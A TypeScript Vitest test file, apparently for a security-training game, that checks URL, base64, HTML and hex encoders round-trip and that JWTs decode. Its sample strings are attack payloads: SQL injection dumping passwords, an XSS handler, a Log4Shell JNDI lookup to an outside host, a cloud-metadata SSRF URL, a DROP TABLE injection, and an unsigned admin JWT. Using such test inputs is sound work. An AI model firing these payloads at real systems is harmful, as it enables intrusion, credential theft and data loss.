import { describe, expect, it } from 'vitest';
import { decode, decodeJwt, encode, encodeJwt, encodeLayers } from '../src/game/encoding';
import type { Encoding } from '../src/game/types';

const samples = [
  "1 UNION SELECT username,password FROM users--",
  '<img src=x onerror=alert(document.domain)>',
  '${jndi:ldap://abc.oast.fun/a}',
  '{"url":"http://169.254.169.254/latest/"}',
  "Robert'); DROP TABLE Students;--",
];

describe('encoding', () => {
  it('every encoder round-trips through its decoder', () => {
    for (const s of samples) {
      for (const enc of ['url', 'base64', 'html', 'hex'] as Encoding[]) {
        expect(decode(encode(s, enc), enc)).toBe(s);
      }
    }
  });

  it('peels stacked layers outermost first', () => {
    const layers: Encoding[] = ['hex', 'url', 'base64'];
    let s = encodeLayers(samples[1], layers);
    for (const enc of [...layers].reverse()) s = decode(s, enc)!;
    expect(s).toBe(samples[1]);
  });

  it('refuses decoders that do not apply', () => {
    expect(decode('wireless mouse', 'url')).toBeNull();
    expect(decode('wireless mouse', 'base64')).toBeNull();
    expect(decode('password', 'base64')).toBeNull();
    expect(decode('plain', 'html')).toBeNull();
  });

  it('decodes JWTs', () => {
    const t = encodeJwt({ alg: 'none' }, { role: 'admin' }, '');
    expect(decodeJwt('Bearer ' + t)).toEqual({ header: '{"alg":"none"}', payload: '{"role":"admin"}', signature: '' });
  });
});
